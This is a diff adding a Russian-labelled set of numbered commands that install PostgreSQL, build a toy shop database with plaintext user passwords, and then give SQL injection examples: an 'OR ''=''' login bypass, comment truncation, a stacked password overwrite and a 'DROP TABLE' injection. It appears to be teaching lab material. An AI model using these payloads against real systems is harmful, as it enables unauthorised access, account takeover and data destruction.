@@ -1,0 +1,33 @@
+(1) sudo apt show postgresql
+(2) sudo systemctl start postgresql
+(3) sudo systemctl status postgresql
+(4) sudo apt update && sudo apt upgrade -y
+(5) sudo apt install postgresql -y
+(6) sudo systemctl start postgresql
+(7) sudo su - postgres
+
+(8) ALTER USER postgres WITH PASSWORD 'ваш_пароль';
+(9) CREATE DATABASE lab_injections;
+(10) \c lab_injection
+
+(11)
+CREATE TABLE users (user_id SERIAL PRIMARY KEY, username VARCHAR(50), password VARCHAR(60), personal_info TEXT, payment_info TEXT);
+CREATE TABLE roles (role_id SERIAL PRIMARY KEY, role_name VARCHAR(50));
+CREATE TABLE user_roles (user_id INT REFERENCES users(user_id), role_id INT REFERENCES roles(role_id), PRIMARY KEY (user_id, role_id));
+CREATE TABLE categories (category_id SERIAL PRIMARY KEY, category_name VARCHAR(100));
+CREATE TABLE products (product_id SERIAL PRIMARY KEY, name VARCHAR(100), price DECIMAL(10,2), category_id INT REFERENCES categories(category_id));
+
+(12)
+INSERT INTO roles (role_name) VALUES ('Admin'), ('User');
+INSERT INTO categories (category_name) VALUES ('Laptops'), ('Smartphones'), ('Headphones');
+INSERT INTO products (name, price, category_id) VALUES ('Laptop X1', 1299.99, 1), ('Smartphone Y', 699.99, 2), ('Wireless Headphones Z', 129.99, 3);
+INSERT INTO users (username, password, personal_info, payment_info) VALUES ('alice', 'alice_pass', 'Alice Personal Info', 'Alice Payment Info'), ('bob', 'bob_pass', 'Bob Personal Info', 'Bob Payment Info');
+
+
+примеры
+(13) SELECT * FROM users WHERE username = 'alice' OR ''='' AND password = '';
+(14) SELECT * FROM users WHERE username='alice';-- ' AND password='';
+(15) UPDATE users SET password = 'новый_пароль' WHERE username = 'bob';
+(16) UPDATE users SET password = 'new_pass_bob '; UPDATE users SET password = 'новый_пароль_для_Alice' WHERE username = 'alice'; -- 'WHERE username = 'bob';
+(17) SELECT * FROM users WHERE username = 'alice';
+(18) SELECT * FROM users WHERE username = ''; DROP TABLE products; --';
